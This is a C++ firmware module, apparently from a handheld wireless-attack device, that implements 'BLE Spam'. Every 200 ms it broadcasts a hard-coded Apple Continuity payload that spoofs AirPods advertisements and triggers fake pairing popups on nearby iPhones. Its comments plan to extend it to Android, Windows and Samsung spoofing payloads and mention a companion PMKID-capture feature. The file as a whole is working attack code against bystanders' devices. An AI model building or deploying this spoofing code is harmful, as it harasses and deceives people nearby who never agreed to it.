#include "ble_spam.h"
#include "ble_common.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <Arduino.h> // Serial (real NimBLE return-code logging, same as c2link_ble.cpp/ble_scan.cpp)
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>

extern FeatureRegistry g_registry;

namespace BleSpamFeature {

// Apple Continuity "AirPods"-style advertisement payload -- a well-known,
// widely-referenced-in-donor-codebases fixed byte sequence advertising a
// fake AirPods pairing popup. Reproduced from the same public Apple
// Continuity protocol documentation Bruce/Poseidon's own ble_spam.cpp files
// cite (Apple manufacturer ID 0x004C, type 0x07 "Airpods"). This single
// payload is Task 8's proof-of-concept; the deferred second plan's ble_spam
// task should expand this into the donor projects' full multi-vendor
// payload table (Android Fast Pair, Windows Swift Pair, Samsung) --
// deliberately out of scope here to keep this task's own real-hardware
// verification loop small.
static const uint8_t kAirpodsPayload[] = {
    0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static bool s_active = false;
static uint32_t s_last_rotate_ms = 0;
static lv_obj_t *s_status_label = nullptr;

// IMPORTANT, real architectural constraint (not a bug to fix silently):
// legacy BLE advertising (what c2link_ble.cpp already uses, and what this
// function uses too -- this project has not configured NimBLE's Extended
// Advertising, which is what would be needed for multiple *simultaneous*
// advertising instances) supports exactly ONE active advertisement at a
// time, system-wide. Starting this spam advertisement STOPS c2link_ble's
// existing C2 advertisement rather than running alongside it -- while BLE
// Spam is open, the Tab5 will not be discoverable/connectable as
// "Quarky-Tab5" for pairing. This is a real, disclosed tradeoff -- restoring
// the C2 advertisement when this screen closes is a reasonable follow-up
// (would need a small addition to c2link_ble.h/.cpp exposing a "re-arm
// advertising" call) but is left out of this task's scope; noted here and in
// the task report rather than silently shipping it undocumented. The C2
// advertisement does NOT resume on its own when this screen closes -- that
// is expected, disclosed behavior, not a bug to chase during hardware
// verification.
static void send_one_advertisement() {
    ble_gap_adv_stop(); // no-op (returns an error this ignores) if nothing is currently advertising

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.mfg_data = kAirpodsPayload;
    fields.mfg_data_len = sizeof(kAirpodsPayload);

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
        return;
    }

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON; // non-connectable -- this is a broadcast-only spoof, not a real peripheral
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] adv_start rc=%d\n", rc);
    }
}

// Amendment (2026-08-12), same as Task 5/Task 7: build through build_sub_screen()
// (ui/screen_scaffold.h) rather than hand-rolling lv_obj_create(nullptr) + a
// manual Back button -- see screen_scaffold.cpp for the real hardware
// measurements that made hand-positioned Back buttons unusable.
static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Spam (AirPods)", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Spamming...");

    // s_active/s_status_label must not outlive the screen -- the scaffold's
    // Back button pops the screen and deletes it (and everything parented
    // under it, including this label) via ScreenStack::pop(). Clearing this
    // state from the label's own LV_EVENT_DELETE, rather than a Back-button
    // click handler, covers every path that can destroy it (not just a tap
    // on Back) -- same pattern ble_scan.cpp uses for its own s_list/
    // s_scanning teardown.
    //
    // Final whole-branch review finding I1 (2026-08-13): this used to clear
    // only s_active/s_status_label, leaving the last ble_gap_adv_start(...,
    // BLE_HS_FOREVER, ...) issued by send_one_advertisement() still live --
    // the Tab5 kept broadcasting the spoofed AirPods payload indefinitely
    // after Back was tapped, with no UI indicating it, matching neither
    // wifi_pmkid.cpp's nor ble_scan.cpp's precedent (both stop their radio
    // activity from this exact handler). Fixed by adding ble_gap_adv_stop()
    // here, symmetric with those two.
    //
    // This does NOT restore c2link_ble's C2 advertisement -- that remains
    // the disclosed, explicitly out-of-scope follow-up (a
    // c2link_ble_rearm_advertising() call, per the file-level comment
    // above). Stopping the transmitter is the part that must not wait;
    // re-arming the C2 link is real follow-up work, not a one-line fix.
    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;
        int rc = ble_gap_adv_stop();
        Serial.printf("quarky-tab5: [ble-spam] ble_gap_adv_stop rc=%d\n", rc);
    }, LV_EVENT_DELETE, nullptr);

    s_active = true;
    s_last_rotate_ms = 0; // force an immediate first send in poll()

    // Real-hardware verification diagnostic (2026-08-13): logging the exact
    // address this advertisement broadcasts under, so it can be searched for
    // by MAC in a real BLE scanner's results -- distinguishing "not
    // broadcasting at all" from "broadcasting, but not recognized/shown as
    // an AirPods popup" (the latter is a known, common outcome on iOS
    // versions that have hardened against this class of Continuity spoof;
    // not a code defect if the address IS found broadcasting the expected
    // payload).
    uint8_t own_addr_val[6];
    if (ble_hs_id_copy_addr(BLE_ADDR_PUBLIC, own_addr_val, nullptr) == 0) {
        char addr_str[18];
        ble_addr_to_str(own_addr_val, addr_str);
        Serial.printf("quarky-tab5: [ble-spam] broadcasting under address %s\n", addr_str);
    }

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_spam", "BLE Spam (AirPods)", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active) return;
    uint32_t now = millis();
    if (now - s_last_rotate_ms < 200) return;
    send_one_advertisement();
    s_last_rotate_ms = now;
}

} // namespace BleSpamFeature
